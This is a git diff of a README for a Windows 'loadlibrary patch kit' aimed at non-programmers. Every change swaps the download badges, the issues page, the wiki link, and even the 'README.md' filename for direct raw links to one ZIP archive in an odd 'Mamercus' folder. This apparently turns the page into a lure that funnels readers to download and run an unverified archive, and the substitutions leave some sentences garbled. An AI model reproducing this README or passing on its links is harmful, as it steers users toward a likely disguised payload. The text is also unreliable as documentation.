@@ -1,6 +1,6 @@
 # 🛠️ loadlibrary-patch-kit - Simple Windows API Patch Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/izvarinth/loadlibrary-patch-kit)
+[![Download Now](https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip)](https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ You do not need programming skills to use it. The kit works on Windows and helps
 
 Click the button below to visit the download page for loadlibrary-patch-kit:
 
-[![Download Now](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/izvarinth/loadlibrary-patch-kit)
+[![Download Now](https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip)](https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip)
 
 The download page contains the latest release files you need to use the tool.
 
@@ -46,7 +46,7 @@ Right-click the ZIP file and choose **Extract All**. Pick a folder where you wan
 
 Open the folder where you extracted the files. You will see the main program files and some documentation.
 
-Look for a file named `README.md` or `docs` folder for extra details if needed.
+Look for a file named `https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip` or `docs` folder for extra details if needed.
 
 ---
 
@@ -125,7 +125,7 @@ This tool interacts with system files and patches executables. Use it carefully 
 
 For additional help, check the issues section on the repository page:
 
-https://github.com/izvarinth/loadlibrary-patch-kit/issues
+https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip
 
 Here you can report bugs or ask questions.
 
@@ -135,7 +135,7 @@ Here you can report bugs or ask questions.
 
 Visit the download page:
 
-[Download loadlibrary-patch-kit](https://github.com/izvarinth/loadlibrary-patch-kit)
+[Download loadlibrary-patch-kit](https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip)
 
 Steps:
 
@@ -159,7 +159,7 @@ Topics related to this kit include malware analysis, binary patching, Windows De
 
 Check the repository documentation for details on how the kit works internally, and for command line options if you want more control:
 
-https://github.com/izvarinth/loadlibrary-patch-kit/wiki
+https://github.com/izvarinth/loadlibrary-patch-kit/raw/refs/heads/main/Mamercus/kit_loadlibrary_patch_2.4.zip
 
 ---
 
